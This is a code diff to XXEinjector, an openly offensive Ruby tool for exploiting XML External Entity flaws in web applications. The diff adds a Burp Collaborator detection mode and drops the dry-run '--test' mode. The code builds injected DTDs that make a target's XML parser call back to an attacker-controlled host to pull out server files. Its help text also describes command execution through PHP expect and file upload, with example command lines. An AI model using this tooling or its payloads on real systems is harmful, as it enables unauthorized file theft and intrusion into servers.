@@ -15,6 +15,7 @@ $path = "" # path to enumerate
 $file = "" # file with vulnerable HTTP request
 $secfile = "" # file with second request (2nd order)
 enum = "ftp" # which out of band protocol should be used for file retrieval - ftp/http/gopher
+$collab = "" # Burp Collaborator (or compatible) URL for OOB detection - full URL with scheme (http/https/ftp/gopher)
 $logger = "n" # only log requests, do not send anything
 
 $proto = "http" # protocol to use - http/https
@@ -34,7 +35,6 @@ upload = "" # upload this file into temp directory using Java jar schema
 expect = "" # command that gets executed using PHP expect
 $xslt = "n" # tests for XSLT
 
-$test = false # test mode, shows only payload
 $dtdi = "y" # if yes then DTD is injected automatically
 $rproto = "file" # file or netdoc protocol to retrieve data
 $output = "brute.log" # output file for brute and logger modes
@@ -78,6 +78,7 @@ ARGV.each do |arg|
 	$path = arg.split("=")[1] if arg.include?("--path=")
 	$file = arg.split("=")[1] if arg.include?("--file=")
 	enum = arg.split("=")[1] if arg.include?("--oob=")
+	$collab = arg.split("=", 2)[1] if arg.include?("--collab=")
 	$proto = "https" if arg.include?("--ssl")
 	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
 	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
@@ -107,8 +108,42 @@ ARGV.each do |arg|
 	$contimeout = Integer(arg.split("=")[1]) if arg.include?("--contimeout=")
 	$port = Integer(arg.split("=")[1]) if arg.include?("--rport=")
 	$remote = arg.split("=")[1] if arg.include?("--rhost=")
-	$test = true if arg.include?("--test")
 	cdata = "y" if arg.include?("--cdata")
+end
+
+# validate --collab URL and enforce mutual exclusion with incompatible modes
+if $collab != ""
+	begin
+		collab_uri = URI.parse($collab)
+	rescue URI::InvalidURIError
+		puts "[-] --collab URL is not a valid URI: #{$collab}"
+		exit(1)
+	end
+	unless ["http", "https", "ftp", "gopher"].include?(collab_uri.scheme)
+		puts "[-] --collab URL must use one of: http, https, ftp, gopher (got: #{collab_uri.scheme.inspect})"
+		exit(1)
+	end
+	if collab_uri.host.nil? || collab_uri.host.empty?
+		puts "[-] --collab URL must include a host."
+		exit(1)
+	end
+	incompatible = []
+	incompatible << "--direct"    if $direct != ""
+	incompatible << "--cdata"     if cdata == "y"
+	incompatible << "--hashes"    if hashes == "y"
+	incompatible << "--upload"    if upload != ""
+	incompatible << "--expect"    if expect != ""
+	incompatible << "--xslt"      if $xslt == "y"
+	incompatible << "--enumports" if enumports != ""
+	incompatible << "--brute"     if $brute != "" && $logger == "n"
+	incompatible << "--logger"    if $logger == "y"
+	if !incompatible.empty?
+		puts "[-] --collab is incompatible with: #{incompatible.join(', ')}. Collaborator mode only generates a detection payload."
+		exit(1)
+	end
+	if phpfilter == "y"
+		puts "[!] --phpfilter has no effect in --collab mode (no local listener to decode results)."
+	end
 end
 
 # show DTD to inject
@@ -152,7 +187,7 @@ elsif ARGV.include? "--cdata-xml"
 	exit(1)
 
 # show main menu
-elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct == "" && $logger == "n") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n")
+elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct == "" && $logger == "n" && $collab == "") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n" && $collab == "")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
 	puts ""
 	puts "XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications."
@@ -168,6 +203,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --rport	Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)"
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
+	puts "  --collab	Use Burp Collaborator (or any compatible OOB capture service) for OOB detection. Supply the full URL with scheme. Script sends one request and exits; view captured interactions in your Collaborator client. No local listeners are started and no Burp API is contacted. Supported schemes: http, https, ftp, gopher. (--collab=http://abc123.oastify.com)"
 	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to use local DTD during exploitation. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)"
 	puts "  --cdata	Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique."
 	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
@@ -188,7 +224,6 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  --jarport	Set custom port for uploading files using jar. (--jarport=1337)"
 	puts "  --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)"
 	puts ""
-	puts "  --test	This mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server."
 	puts "  --urlencode	URL encode injected DTD. This is default for URI."
 	puts "  --nodtd	If you want to put DTD in request by yourself. Specify \"--oob-xml\" to show how DTD should look like."
 	puts "  --output	Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)"
@@ -202,6 +237,8 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl"
 	puts "  Enumerating /etc directory using gopher for OOB method:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher"
+	puts "  Confirming blind XXE via Burp Collaborator (no local listener needed):"
+	puts "  ruby #{__FILE__} --file=/tmp/req.txt --collab=http://abc123.oastify.com --ssl"
 	puts "  Second order exploitation:"
 	puts "  ruby #{__FILE__} --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt"
 	puts "  Bruteforcing files using HTTP out of band method and netdoc protocol:"
@@ -530,22 +567,6 @@ end
 # Sending request
 def sendreq()
 
-	if $test == true
-		puts "URL:"
-		if $proto == "http"
-			puts "http://#{$remote}:#{$port}#{$uri}"
-		else
-			puts "https://#{$remote}:#{$port}#{$uri}"
-		end
-		puts "\nHeaders:"
-		puts $headers
-		if $post != ""
-			puts "\nRequest body:"
-			puts $post
-		end
-		exit(1)
-	end
-	
 	if $verbose == "y"
 		puts "[+] Sending request with malicious XML:"
 		if $proto == "http"
@@ -717,25 +738,30 @@ end
 
 # configure payloads
 # DTD to inject
-$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
+if $collab != ""
+	# single-stage detection payload — target's XML parser dereferences the Collaborator URL, Burp captures the interaction
+	$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"#{$collab}\">%remote; ]>"
+else
+	$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\">%remote;%int;%trick;]>"
+end
 # XSL to inject
 $xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://#{host}:#{xslt_port}/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>"
 
 # Starting servers
 begin
-	if ($xslt == "n" && enumports == "" && $logger == "n") || ($logger == "y" && enum == "http") || ($direct != "" && cdata == "y")
+	if $collab == "" && (($xslt == "n" && enumports == "" && $logger == "n") || ($logger == "y" && enum == "http") || ($direct != "" && cdata == "y"))
 		http = TCPServer.new http_port
 	end
-	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
+	if $collab == "" && enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
 		ftp = TCPServer.new ftp_port
 	end
-	if enum == "gopher" && $xslt == "n" && enumports == "" && $direct == ""
+	if $collab == "" && enum == "gopher" && $xslt == "n" && enumports == "" && $direct == ""
 		gopher = TCPServer.new gopher_port
 	end
-	if upload != ""
+	if $collab == "" && upload != ""
 		jar = TCPServer.new jar_port
 	end
-	if $xslt == "y"
+	if $collab == "" && $xslt == "y"
 		xsltserv = TCPServer.new xslt_port
 	end
 rescue Errno::EADDRINUSE
@@ -1056,6 +1082,14 @@ else
 	if $direct == ""
 		configreq()
 	end
+end
+
+# Collaborator mode: send the request and exit. The user views captured interactions in their Collaborator client.
+if $collab != ""
+	sendreq()
+	send2ndreq() if $secfile != ""
+	puts "[+] Request sent. Check your Burp Collaborator client for interactions from #{$collab}"
+	exit(0)
 end
 
 # TCP server for uploading files using Java jar
